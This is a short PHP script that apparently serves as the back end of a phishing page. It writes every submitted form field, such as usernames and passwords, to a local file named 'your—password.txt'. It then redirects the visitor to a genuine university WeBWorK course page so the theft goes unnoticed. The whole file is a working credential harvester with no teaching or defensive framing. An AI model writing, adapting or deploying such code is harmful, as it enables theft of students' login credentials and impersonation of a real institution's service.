<?php
$file = fopen("your—password.txt", "a");
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "\r\n");
foreach($_POST as $key=>$vatue) {
    fwrite($file, "\t\t\t\t\t\t");
    fwrite($file, $key);
    fwrite($file, "=");
    fwrite($file, $vatue);
    fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fwrite($file, "\t\t\t\t\t\t");
fclose($file);
header("Location:https://webwork.ucd.ie/webwork2/Math-10260-Greferath/");
die();
?>